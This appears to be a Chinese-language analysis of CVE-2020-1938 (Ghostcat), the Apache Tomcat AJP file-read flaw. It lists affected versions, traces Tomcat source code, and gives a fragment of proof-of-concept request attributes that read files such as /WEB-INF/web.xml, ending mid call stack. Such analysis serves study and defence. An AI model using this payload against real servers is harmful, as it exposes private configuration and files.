<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X31afae13763367eb1d200d9c142c8c54ef789f0"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2020-1938</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Apache Tomcat </span><span class="csECDA2D3">文件包含漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">对于处在漏洞影响版本范围内的</span><span class="cs8926E06"> Tomcat </span><span class="cs9C1B1871">而言，若其开启</span><span class="cs8926E06"> AJP Connector </span><span class="cs9C1B1871">且攻击者能够访问</span><span class="cs8926E06"> AJP Connector </span><span class="cs9C1B1871">服务端口的情况下，即存在被</span><span class="cs8926E06"> Ghostcat </span><span class="cs9C1B1871">漏洞利用的风险。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">注意</span><span class="cs8926E06"> Tomcat AJP Connector </span><span class="cs9C1B1871">默认配置下即为开启状态，且监听在</span><span class="cs8926E06"> 0.0.0.0:8009</span></p><h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">Apache Tomcat 6</span></li><li class="cs24C36B3"><span class="cs8926E06">Apache Tomcat 7 &lt; 7.0.100</span></li><li class="cs24C36B3"><span class="cs8926E06">Apache Tomcat 8 &lt; 8.5.51</span></li><li class="cs24C36B3"><span class="cs8926E06">Apache Tomcat 9 &lt; 9.0.31</span></li></ul>
		<h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">由于</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">AJP</span><span class="cs8926E06"> </span><span class="cs9C1B1871">并不是一个</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">HTTP</span><span class="cs8926E06"> </span><span class="cs9C1B1871">业务流，走的是</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">Socket</span><span class="cs8926E06"> </span><span class="cs9C1B1871">，所以</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">tomcat</span><span class="cs8926E06"> </span><span class="cs9C1B1871">前面接收业务流的时候调用的是一个</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">Socket</span><span class="cs8926E06"> </span><span class="cs9C1B1871">解析类</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">SocketProcessorBase#dorun</span><span class="cs8926E06"> </span><span class="cs9C1B1871">来处理</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">ajp</span><span class="cs8926E06"> </span><span class="cs9C1B1871">传入的二进制流。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2020-1938%ef%bc%89Apache%20Tomcat%20%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="55" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">而后面这部分的数据流实际上都是</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">socket</span><span class="cs8926E06"> </span><span class="cs9C1B1871">内部进行流传处理。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2020-1938%ef%bc%89Apache%20Tomcat%20%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="146" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里需要感谢</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">tomcat</span><span class="cs8926E06"> </span><span class="cs9C1B1871">优雅的代码风格，可读性真强，和</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">socket</span><span class="cs8926E06"> </span><span class="cs9C1B1871">相关的</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">service</span><span class="cs8926E06"> </span><span class="cs9C1B1871">就下图里面的这些，所以</span><span class="cs8926E06">AJP</span><span class="cs9C1B1871">的业务流自然就落在了</span><span class="cs9FB05234">org/apache/coyote/ajp/AjpProcessor#service</span><span class="cs9C1B1871">这个方法上面进行处理。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2020-1938%ef%bc%89Apache%20Tomcat%20%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="108" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这</span><span class="cs9FB05234">org/apache/coyote/ajp/AjpProcessor#service</span><span class="cs9C1B1871">这个方法里面就留两个关键部分，其他代码太繁杂了，无关大雅，这里首先</span><span class="cs9FB05234">this.prepareRequest()</span><span class="cs9C1B1871">方法是针对整个业务流进行预处理。</span></p><p class="cs3A447A38"><span class="cs9FB05234">Copy to clipboard &nbsp;&nbsp;&nbsp;public SocketState service(SocketWrapperBase&lt;?&gt; socket) throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(!this.getErrorState().isError() &amp;&amp; !this.endpoint.isPaused()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (this.getErrorState().isIoAllowed()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rp.setStage(2);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.prepareRequest();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (Throwable var12) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (this.getErrorState().isIoAllowed()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rp.setStage(3);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.getAdapter().service(this.request, this.response);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">prepareRequest</span><span class="cs8926E06"> </span><span class="cs9C1B1871">方法，这个方法会进行一个</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">while</span><span class="cs8926E06"> </span><span class="cs9C1B1871">为</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">true</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的无限循环，根据</span><span class="cs9FB05234">attributeCode</span><span class="cs9C1B1871">的结果进行选择，命中</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">case 10</span><span class="cs8926E06"> </span><span class="cs9C1B1871">核心中有个</span><span class="cs9FB05234">request.setAttribute(n, v)</span><span class="cs9C1B1871">方法，这个方法会从我们之前设置方法中取值，设置，遍历循环</span><span class="cs8926E06">POC</span><span class="cs9C1B1871">中的</span><span class="cs9FB05234">javax.servlet.include.request_uri</span><span class="cs9C1B1871">，</span><span class="cs9FB05234">javax.servlet.include.path_info</span><span class="cs9C1B1871">，</span><span class="cs9FB05234">javax.servlet.include.servlet_path</span><span class="cs9C1B1871">这三个属性对应的值，并且通过</span><span class="cs8926E06">PUT</span><span class="cs9C1B1871">方法进行赋值。</span></p><p class="cs3A447A38"><span class="cs9FB05234">Copy to clipboard &nbsp;&nbsp;&nbsp;private void prepareRequest() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(true) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;byte attributeCode;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while((attributeCode = this.requestHeaderMessage.getByte()) != -1) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch(attributeCode) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case 10:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.request.setAttribute(n, v);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2020-1938%ef%bc%89Apache%20Tomcat%20%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="189" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">好了，这里知道了在</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">prepareRequest</span><span class="cs8926E06"> </span><span class="cs9C1B1871">方法中核心是将三个值动态赋予我们想要的结果，再回到</span><span class="cs9FB05234">org/apache/coyote/ajp/AjpProcessor#service</span><span class="cs9C1B1871">中，在经过</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">prepareRequest</span><span class="cs8926E06"> </span><span class="cs9C1B1871">方法处理之后来到的就是</span><span class="cs9FB05234">getAdapter().service(this.request, this.response);</span><span class="cs9C1B1871">，这个</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">serivce</span><span class="cs8926E06"> </span><span class="cs9C1B1871">就是后续处理</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">request</span><span class="cs8926E06"> </span><span class="cs9C1B1871">对象和</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">response</span><span class="cs8926E06"> </span><span class="cs9C1B1871">对象了。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2020-1938%ef%bc%89Apache%20Tomcat%20%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="199" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">org/apache/catalina/connector/CoyoteAdapter#service</span><span class="cs8926E06"> </span><span class="cs9C1B1871">这个类中，主要是设置一些连接的时候一些属性，然后通过</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">invoke</span><span class="cs8926E06"> </span><span class="cs9C1B1871">反射方法，根据</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">request</span><span class="cs8926E06"> </span><span class="cs9C1B1871">对象和</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">response</span><span class="cs8926E06"> </span><span class="cs9C1B1871">对象进入后面的</span><span class="cs8926E06">HTTP</span><span class="cs9C1B1871">处理逻辑。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2020-1938%ef%bc%89Apache%20Tomcat%20%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image5.png" width="560" height="142" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2020-1938%ef%bc%89Apache%20Tomcat%20%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image6.png" width="560" height="52" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">所以又回到了前面的老话，</span><span class="cs8926E06">tomcat</span><span class="cs9C1B1871">完善的代码结构，</span><span class="cs8926E06">HTTP</span><span class="cs9C1B1871">的逻辑服务处理，自然是落在了</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">javax/servlet/http/HttpServlet#service</span><span class="cs8926E06"> </span><span class="cs9C1B1871">当中。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2020-1938%ef%bc%89Apache%20Tomcat%20%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image7.png" width="560" height="98" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="任意文件读取"><span class="csD6CA00D2">任意文件读取</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">前面是整个</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">AJP-&gt;HTTP</span><span class="cs8926E06"> </span><span class="cs9C1B1871">整个过程，继续往下跟入，因为通过</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">AJP</span><span class="cs8926E06"> </span><span class="cs9C1B1871">转换之后，进行的是</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">HTTP GET</span><span class="cs8926E06"> </span><span class="cs9C1B1871">请求，所以来到的自然是是下图中代码位置。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2020-1938%ef%bc%89Apache%20Tomcat%20%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image8.png" width="560" height="58" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">doGet</span><span class="cs8926E06"> </span><span class="cs9C1B1871">自然来到之前安恒通告说的地方。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2020-1938%ef%bc%89Apache%20Tomcat%20%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image9.png" width="560" height="26" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">继续跟入</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">serveResource</span><span class="cs9C1B1871">，首先</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">getRelativePath</span><span class="cs8926E06"> </span><span class="cs9C1B1871">从之前传入的</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">request</span><span class="cs8926E06"> </span><span class="cs9C1B1871">对象中获取</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">path</span><span class="cs8926E06"> </span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2020-1938%ef%bc%89Apache%20Tomcat%20%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image10.png" width="560" height="70" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">getRelativePath</span><span class="cs8926E06"> </span><span class="cs9C1B1871">，一眼就知道为什么要设置</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">request_uri</span><span class="cs8926E06"> </span><span class="cs9C1B1871">、</span><span class="cs5BEC2C28">path_info</span><span class="cs8926E06"> </span><span class="cs9C1B1871">、</span><span class="cs5BEC2C28">servlet_path</span><span class="cs8926E06"> </span><span class="cs9C1B1871">这三个属性了，通过路径的拼接，最后返回的</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">servletPath</span><span class="cs8926E06"> </span><span class="cs9C1B1871">为</span><span class="cs9FB05234">/</span><span class="cs9C1B1871">，容器内部为</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">/WEB-INF/web.xml</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的文件内容。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2020-1938%ef%bc%89Apache%20Tomcat%20%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image11.png" width="560" height="243" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">继续回到</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">serveResource</span><span class="cs8926E06"> </span><span class="cs9C1B1871">方法中</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">getResource</span><span class="cs8926E06"> </span><span class="cs9C1B1871">根据前面的</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">path</span><span class="cs8926E06"> </span><span class="cs9C1B1871">也就是</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">/WEB-INF/web.xml</span><span class="cs8926E06"> </span><span class="cs9C1B1871">进行资源获取。而这里是没办法</span><span class="cs9FB05234">../</span><span class="cs9C1B1871">出去的，原因继续往下看。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2020-1938%ef%bc%89Apache%20Tomcat%20%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image12.png" width="560" height="136" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">getResource</span><span class="cs8926E06"> </span><span class="cs9C1B1871">当中有个</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">validate</span><span class="cs8926E06"> </span><span class="cs9C1B1871">，这个检查往后走会调用</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">normalize</span><span class="cs8926E06"> </span><span class="cs9C1B1871">进行目录遍历的检查，之后就是输出读到的内容了。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2020-1938%ef%bc%89Apache%20Tomcat%20%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image13.png" width="560" height="59" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2020-1938%ef%bc%89Apache%20Tomcat%20%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image14.png" width="560" height="139" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">由于当前</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">AJP</span><span class="cs8926E06"> </span><span class="cs9C1B1871">出不了</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">webapps</span><span class="cs8926E06"> </span><span class="cs9C1B1871">目录，但是是可以做到任意目录下读的，比如我需要读</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">/example/2.txt</span><span class="cs8926E06"> </span><span class="cs9C1B1871">下的文件，只需要这样配置就好了。</span></p><p class="cs3A447A38"><span class="cs9FB05234">Copy to clipboard &nbsp;&nbsp;&nbsp;{&#39;name&#39;:&#39;req_attribute&#39;,&#39;value&#39;:[&#39;javax.servlet.include.request_uri&#39;,&#39;/examples&#39;]},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{&#39;name&#39;:&#39;req_attribute&#39;,&#39;value&#39;:[&#39;javax.servlet.include.path_info&#39;,2.txt]},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{&#39;name&#39;:&#39;req_attribute&#39;,&#39;value&#39;:[&#39;javax.servlet.include.servlet_path&#39;,&#39;/&#39;]},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;])</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2020-1938%ef%bc%89Apache%20Tomcat%20%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image15.png" width="560" height="124" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">附上任意文件读取的调用栈</span></p><p class="cs3A447A38"><span class="cs9FB05234">Copy to clipboardserveResource:839, DefaultServlet (org.apache.catalina.servlets)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">doGet:504, DefaultServlet (org.apache.catalina.servlets)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">service:634, HttpServlet (javax.servlet.http)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">service:484, DefaultServlet (org.apache.catalina.servlets)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">service:741, HttpServlet (javax.servlet.http)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">doFilter:52, WsFilter (org.apache.tomcat.websocket.server)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">invoke:199, StandardWrapperValve (org.apache.catalina.core)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">invoke:96, StandardContextValve (org.apache.catalina.core)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">invoke:493, AuthenticatorBase (org.apache.catalina.authenticator)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">invoke:137, StandardHostValve (org.apache.catalina.core)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">invoke:81, ErrorReportValve (org.apache.catalina.valves)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">invoke:660, AbstractAccessLogValve 